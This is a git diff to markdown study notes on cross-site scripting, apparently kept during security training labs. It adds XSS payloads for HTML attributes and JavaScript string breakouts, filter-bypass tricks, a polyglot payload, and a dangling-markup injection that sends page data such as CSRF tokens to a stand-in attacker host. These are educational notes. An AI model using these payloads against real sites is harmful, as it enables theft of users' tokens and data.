@@ -208,6 +208,55 @@ $(window).on("hashchange", function () {
 <img src="1" onerror="alert(1)" />
 ```
 
+- see the labs from 11 - 14
+
+### XSS in HTML tag attributes
+
+- `" autofocus onfocus=alert(1) x="`
+- `<a href="javascript:alert(1)">`
+
+### XSS in JS bypass
+
+- `';alert(1)//` - to break out of JS string
+- `</script><script>alert(1)</script>` - if `'\` are filtered
+- `\';alert(1)//` - if `'` is filtered
+- `<script>onerror=alert;throw 1</script>` - execute without parentheses
+- `<script>{onerror=alert}throw 1</script>` - without semicolon
+- `<script>throw onerror=alert,'some string',123,'haha'</script>`
+  - throw - create JS exception and accepts JS expression
+  - onerror - allows to assign a function to JS error handler
+  - alert - will be called when any new exeption is thrown
+  - 'haha' - throw accepts an expression, the assignment to onerror happens before alert is called and the last part of the expression is sent to the exception handler
+- `<script>{onerror=eval}throw'=alert\x281337\x29'</script>`
+- `<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>`
+- `<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>`
+- `&apos;-alert(document.domain)-&apos;`
+
+---
+
+## Dangling markup injection
+
+- technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible
+- suppose an application embeds attacker-controllable data into its responses in an unsafe way
+
+```
+<input type="text" name="input" value="CONTROLLABLE DATA HERE
+```
+
+- suppose it does not filter or escape the `>,"` characters
+- attacker can use `">` to break out of the quoted attribute value and the enclosing tag and return to an HTML context
+- suppose attacker can't perform regular XSS attack due to input filters, content security policy or other obstacles
+- it is still be possible to deliver a dangling markup injection attack using payload like
+
+```
+"><img src='//attacker-website.com?
+```
+
+- note `src` attributes in the payload **doesn't close which is left "dangling"**
+- when a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute
+- everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string which can contain sensitive data such as CSRF tokens, email messages, financial data
+-
+
 ---
 
 ## Payloads Examples
@@ -256,6 +305,6 @@ body:username.value+':'+this.value
 </script>
 ```
 
-````
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e```
-````
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
